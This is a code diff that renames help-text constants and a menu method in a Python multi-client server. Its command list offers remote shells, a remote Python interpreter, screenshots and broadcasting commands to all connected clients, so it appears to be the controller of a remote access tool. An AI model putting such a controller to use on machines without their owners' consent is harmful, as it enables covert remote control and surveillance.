@@ -26,7 +26,7 @@ if not is_windows():
 
 logging.basicConfig(level=logging.CRITICAL)
 
-interface_help = """--h | See this Help Message
+INTERFACE_HELP = """--h | See this Help Message
 --e | Open a shell
 --i | Open Remote Python Interpreter
 --g | Grabs a screenshot
@@ -45,7 +45,7 @@ interface_help = """--h | See this Help Message
 --x (restart) (disconnect) | Manage Client Session
 --b | Run Connection in Background (or CTRL-C)"""
 
-turtle_help = """--h | See this Help Message
+MENU_HELP = """--h | See this Help Message
 --l | List connected Clients
 --i (ID) | Connect to a Client
 --a | Broadcast command to all connected clients
@@ -533,7 +533,7 @@ class MultiServer(object):
         select = command[4:].strip()
         command = command[:3].lower()
         if '--h' in command:
-            print(interface_help)
+            print(INTERFACE_HELP)
             return
         if '--e' in command:
             try:
@@ -738,7 +738,7 @@ class MultiServer(object):
             if self.selector(client, command):
                 break
 
-    def turtle(self) -> None:
+    def menu(self) -> None:
         """ Connection Selector """
         # returns None
         print("Type '--h' for help")
@@ -746,7 +746,7 @@ class MultiServer(object):
             try:
                 command = input('> ')
                 if command == '--h':
-                    print(turtle_help)
+                    print(MENU_HELP)
                 elif command[:3] == '--a':
                     self.broadcast(input('Command to broadcast: '))
                 elif command == '--l':
@@ -797,4 +797,4 @@ def accept_thread(server) -> None:
 if __name__ == '__main__':
     server = MultiServer(8000)
     accept_thread(server)
-    server.turtle()
+    server.menu()
